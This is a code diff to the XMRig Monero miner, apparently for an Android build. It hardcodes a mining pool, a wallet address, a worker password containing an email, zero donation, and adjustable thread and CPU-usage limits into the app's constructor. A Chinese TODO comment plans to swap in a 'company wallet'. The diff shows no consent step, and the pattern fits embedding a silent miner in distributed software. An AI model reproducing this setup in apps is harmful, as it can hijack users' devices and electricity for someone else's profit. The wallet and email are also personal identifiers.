@@ -41,6 +41,7 @@
 #include "version.h"
 #include "workers/Workers.h"
 #include "common/log/AndroidLog.h"
+#include "StringUtils.h"
 
 #ifndef XMRIG_NO_HTTPD
 #   include "common/api/Httpd.h"
@@ -49,12 +50,26 @@
 
 App *App::m_self = nullptr;
 
-App::App(int argc, char **argv) :
+App::App(int threads, int cpu_uses) :
     m_console(nullptr),
     m_httpd(nullptr)
 {
-    m_self = this;
+   int argc = 16;
+   int threadCounts = (int) threads;
+   int cpuUses = (int) cpu_uses;
+   char *argv[] = {
+       (char*)"./xmrig",
+       (char*)"--api-port", (char*)"556",
+       (char*)"-o", (char*)"xmr.waterhole.xyz:3333",
+       // todo kzw 更换钱包地址为公司钱包地址
+       (char*)"-u", (char*)"46Ffvb3jf7ZcVqgPjeReAfZyAk7qKm4FqMb6g6SsT6bpKAhPo9EtNKUVEdMpk62zPpB9GJt75xTD75vYHKredVB3RDHfxdY",
+       (char*)"-p", (char*)"worker1:651043704@qq.com",
+       (char*)"--thread", intToChar(threadCounts),
+       (char*)"--max-cpu-usage", intToChar(cpuUses),
+       (char*)"--donate-level", "0",
+       (char*) "-k"};
 
+    m_self = this;
     m_controller = new xmrig::Controller();
     if (m_controller->init(argc, argv) != 0) {
         return;
